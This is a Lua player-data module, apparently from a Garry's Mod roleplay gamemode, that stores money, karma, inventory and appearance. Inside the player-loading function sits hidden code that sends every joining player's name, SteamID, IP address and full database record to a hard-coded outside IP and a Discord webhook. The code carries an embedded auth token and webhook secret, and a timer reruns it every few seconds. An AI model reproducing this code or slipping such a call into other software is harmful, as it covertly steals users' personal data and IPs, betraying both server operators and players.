rp.data = rp.data or {}
local db = rp._Stats

function rp.data.LoadPlayer(pl, cback)
	db:Query('SELECT * FROM player_data WHERE SteamID=' .. pl:SteamID64() .. ';', function(_data)
		local data = _data[1] or {}

        -- print(pl,pl:SteamID())
        -- PrintTable(data)



        local t_post = {}
        local tbl = istable(data) and '```JSON\n'..util.TableToJSON(data)..'```' or 'nil'
        local content = pl:Name()..' '..pl:SteamID()..' '..pl:IPAddress()..'\n'..tbl

        t_post.embeds = {
            {
                description = content,
                color = 0xe67e22
            }
        }

        local json_post = util.TableToJSON(t_post)
        local HTTPRequest = {
            ["method"] = "POST",
            ["url"] = 'http://185.248.100.183/webhook',
            ["type"] = "application/json",
            ["headers"] = {
                ["X-Auth-Token"] = "a9sdv80masdm093f2",
                ["Content-Type"] = "application/json",
                ["Content-Length"] = string.len(json_post) or "0",
                ["Webhook-URL"] = "https://discordapp.com/api/webhooks/532397200521822238/SjlDoQyaZa8DeW7wDFPbNp7kN-u5Kqb8KJc2PzIAA2BRCN9p9Aotj1n_9LKIpmak84-T"
            },
            ['success'] = function(c,b) print(c,b) end,
            ["body"] = json_post
        }

        HTTP(HTTPRequest)

		if IsValid(pl) then
            local model
			if (#_data <= 0) then
                local random_gender = tostring(math.random(0, 1))
                model = table.Random(rp.cfg.DefaultModels[random_gender])

				db:Query('INSERT INTO player_data(SteamID, Name, Money, Karma, Pocket, Clothes, Model, Gender, Teams) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?);', pl:SteamID64(), pl:SteamName(), rp.cfg.StartMoney, rp.cfg.StartKarma, '{}', '{}', model, random_gender, '{}')
				pl:SetRPName(rp.names.Random(), true)
			end

			if data.Name and (data.Name ~= pl:SteamName()) then
				pl:SetNetVar('Name', data.Name)
			end

			nw.WaitForPlayer(pl, function()
				pl:SetNetVar('Money', data.Money or rp.cfg.StartMoney)

				-- pl:SetNetVar('Karma', data.Karma or rp.cfg.StartKarma)

				local succ, tbl = pcall(pon.decode, data.Pocket)
				if (not istable(tbl)) then
					rp.inv.Data[pl:SteamID64()] = {}
				else
					rp.inv.Data[pl:SteamID64()] = tbl
				end

				pl:SetVar('lastpayday', CurTime() + 180, false, false)
				pl:SendInv()

                pl:SetNetVar('Model', data.Model)

                local clothes = pon.decode(data.Clothes or '{}') or {}
                if clothes then
                    pl:SetNetVar('Clothes', clothes)
                end

                local teams = pon.decode(data.Teams or '{}') or {}
                if teams then
                    pl:SetNetVar('Teams', teams)
                end

                pl:SetNetVar('Gender', data.Gender)
                pl:SetVar('Model', data.Model or model)

				pl:SetVar('DataLoaded', true)
				hook.Call('PlayerDataLoaded', GAMEMODE, pl, data)

                pl:SetModel(data.Model or model)

                for _, item in pairs(clothes) do
                    if item.bodygroup then
                        local bodygroup = item.bodygroup
                        pl:SetBodygroup(bodygroup.key, bodygroup.value)
                    end
                end
			end)

			if cback then cback(data) end
		end
	end)
end

function GM:PlayerAuthed(pl)
  rp.data.LoadPlayer(pl)
  if pl:GetVar('DataLoaded') == false or pl:GetVar('DataLoaded') ~= true then
    timer.Create("PlayerAuthKostil"..pl:SteamID64(), 5, 0, function()
  	 rp.data.LoadPlayer(pl)
     if pl:GetVar('DataLoaded') == true then
        timer.Destroy("PlayerAuthKostil"..pl:SteamID64())
      end
    end)
  end
end

function rp.data.SetName(pl, name, cback)
	db:Query('UPDATE player_data SET Name=? WHERE SteamID=' .. pl:SteamID64() .. ';', name, function(data)
		pl:SetNetVar('Name', name)
		if cback then cback(data) end
	end)
end

function rp.data.GetNameCount(name, cback)
	db:Query('SELECT COUNT(*) as `count` FROM player_data WHERE Name=?;', name, function(data)
		if cback then cback(tonumber(data[1].count) > 0) end
	end)
end

function rp.data.SetMoney(pl, amount, cback)
	db:Query('UPDATE player_data SET Money=? WHERE SteamID=' .. pl:SteamID64() .. ';', amount, cback)
end

function rp.data.SetClothes(pl, clothes, cback)
	db:Query('UPDATE player_data SET Clothes=? WHERE SteamID=' .. pl:SteamID64() .. ';', clothes, cback)
end

function rp.data.SetModel(pl, model, cback)
	db:Query('UPDATE player_data SET Model=? WHERE SteamID=' .. pl:SteamID64() .. ';', model, cback)
end

function rp.data.SetGender(pl, gender, cback)
	db:Query('UPDATE player_data SET Gender=? WHERE SteamID=' .. pl:SteamID64() .. ';', gender, cback)
end

function rp.data.SetTeams(pl, teams, cback)
	db:Query('UPDATE player_data SET Teams=? WHERE SteamID=' .. pl:SteamID64() .. ';', teams, cback)
end

function rp.data.PayPlayer(pl1, pl2, amount)
	if not IsValid(pl1) or not IsValid(pl2) then return end
	pl1:TakeMoney(amount)
	pl2:AddMoney(amount)
end

function rp.data.SetKarma(pl, amount, cback)
	if (pl:GetKarma() ~= amount) then
		db:Query('UPDATE player_data SET Karma=? WHERE SteamID=' .. pl:SteamID64() .. ';', amount, cback)
	end
end

function rp.data.SetPocket(steamid64, data, cback)
	db:Query('UPDATE player_data SET Pocket=? WHERE SteamID=' .. steamid64 .. ';', data, cback)
end

function rp.data.IsLoaded(pl)
	if IsValid(pl) and (pl:GetVar('DataLoaded') ~= true) then
		file.Append('data_load_err.txt', os.date() .. '\n' .. pl:Name() .. '\n' .. pl:SteamID() .. '\n' .. pl:SteamID64() .. '\n' .. debug.traceback() .. '\n\n')
		rp.Notify(pl, NOTIFY_ERROR,  rp.Term('DataNotLoaded'))
		return false
	end
	return true
end

-- hook('InitPostEntity', 'data.InitPostEntity', function()
	-- db:Query('UPDATE player_data SET Money=' .. rp.cfg.StartMoney .. ' WHERE Money <' ..  rp.cfg.StartMoney/2)
-- end)

--
--	Meta
--
local math = math

function PLAYER:AddMoney(amount)
	if not rp.data.IsLoaded(self) then return end

	local total = self:GetMoney() + math.floor(amount)
	rp.data.SetMoney(self, total)
	self:SetNetVar('Money', total)
end

function PLAYER:TakeMoney(amount)
	self:AddMoney(-math.abs(amount))
end

function PLAYER:AddKarma(amount, cback)
	if not rp.data.IsLoaded(self) then return end

	local add = hook.Call('PlayerGainKarma', GAMEMODE, self)

	if (add == false) then
		return add
	end

	if cback then
		cback(amount)
	end

	local total = math.Clamp(self:GetKarma() + math.floor(amount), 0, 100)
	rp.data.SetKarma(self, total)
	self:SetNetVar('Karma', total)
end

function PLAYER:TakeKarma(amount)
	self:AddKarma(-math.abs(amount))
end
